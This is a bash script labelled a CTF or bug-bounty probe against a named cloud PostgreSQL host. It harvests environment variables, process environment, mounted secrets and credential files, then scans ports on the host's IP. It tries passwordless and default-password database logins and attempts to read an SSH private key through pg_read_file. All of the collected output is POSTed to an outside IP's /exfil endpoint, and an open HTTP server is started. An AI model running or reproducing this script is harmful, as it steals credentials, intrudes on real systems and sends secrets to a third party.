#!/bin/bash
# CTF probe v4 - inside-perimeter: env/secret dump FIRST (credential carrier),
# then full sweep + PG auth + direct pg_read_file check + pghostile fallback
TARGET=falcon-bug-bounty-flag-pgsql-dev-sandbox.aivencloud.com
IP=132.145.191.135
OUT=/tmp/probe_results.txt
echo "=== PROBE V4 START $(date -u) ===" > $OUT
echo "HOSTNAME: $(hostname)" >> $OUT
echo "MY IP: $(hostname -I 2>/dev/null | head -1)" >> $OUT

echo "=== [PRIORITY 1] CREDENTIAL CARRIER DUMP ===" >> $OUT
echo "--- env ---" >> $OUT
env | grep -iE "DATABASE_URL|PG|POSTGRES|AVN|CONNECTION|HOST|PORT|USER|PASSWORD|SECRET|TOKEN|URI|DSN" >> $OUT 2>&1
echo "--- /proc/1/environ ---" >> $OUT
cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -iE "DATABASE_URL|PG|POSTGRES|AVN|CONNECTION|SECRET|TOKEN|URI|DSN" >> $OUT 2>&1
echo "--- /run/secrets ---" >> $OUT
ls -la /run/secrets/ 2>/dev/null >> $OUT
for f in /run/secrets/*; do [ -f "$f" ] && echo "  $f: $(cat "$f" 2>/dev/null | head -c 500)" >> $OUT; done 2>/dev/null
echo "--- mounted configs ---" >> $OUT
mount 2>/dev/null | grep -iE "secret|config|token" >> $OUT
echo "--- /etc and app dirs for db creds ---" >> $OUT
find / -maxdepth 3 \( -name "*DATABASE_URL*" -o -name "*.env" -o -name "*credentials*" -o -name "*.pgpass" \) 2>/dev/null | head -20 >> $OUT

echo "=== [PRIORITY 2] DNS ===" >> $OUT
dig +short $TARGET >> $OUT 2>&1 || nslookup $TARGET >> $OUT 2>&1
getent hosts $TARGET >> $OUT 2>&1

echo "=== [PRIORITY 3] FULL PORT SWEEP ===" >> $OUT
for p in 22 80 443 5432 5433 6432 8008 8080 8443 22292 22293 22294 22295 22296 22297 22298 22300 54321 6543 6379 9200 2379 2380 9100 9187 10250 15021 3000 9090 16000 5600 6443 54320 28001; do
  timeout 3 bash -c "echo > /dev/tcp/$IP/$p" 2>/dev/null && echo "OPEN $p" >> $OUT || echo "closed $p" >> $OUT
done

echo "=== [PRIORITY 4] PG: trust + superuser check ===" >> $OUT
for p in 5432 5433 22293 54321 28001; do
  echo "--- trust attempt (no password) :$p ---" >> $OUT
  timeout 6 psql "postgresql://postgres@$IP:$p/postgres?connect_timeout=4" -c "SELECT current_user, rolsuper FROM pg_roles WHERE rolname=current_user;" >> $OUT 2>&1
  echo "--- avnadmin attempt :$p ---" >> $OUT
  timeout 6 psql "postgresql://avnadmin:avnadmin@$IP:$p/postgres?connect_timeout=4" -c "SELECT version();" >> $OUT 2>&1
  echo "" >> $OUT
done

echo "=== [PRIORITY 5] if connected: direct flag read ===" >> $OUT
for p in 5432 5433 22293; do
  timeout 6 psql "postgresql://postgres@$IP:$p/postgres?connect_timeout=4" -c "SELECT pg_read_file('/etc/ssh/ssh_host_ed25519_key');" >> $OUT 2>&1
done

echo "=== [PRIORITY 6] SSH ===" >> $OUT
timeout 5 bash -c "echo | nc -w 3 $IP 22" >> $OUT 2>&1

echo "=== EXFIL ===" >> $OUT
curl -s -m 10 -X POST "http://89.106.78.234:8900/exfil" -d @$OUT -o /dev/null 2>&1
echo "DONE"
python3 -m http.server 8080 --bind 0.0.0.0 >/dev/null 2>&1 &
wait
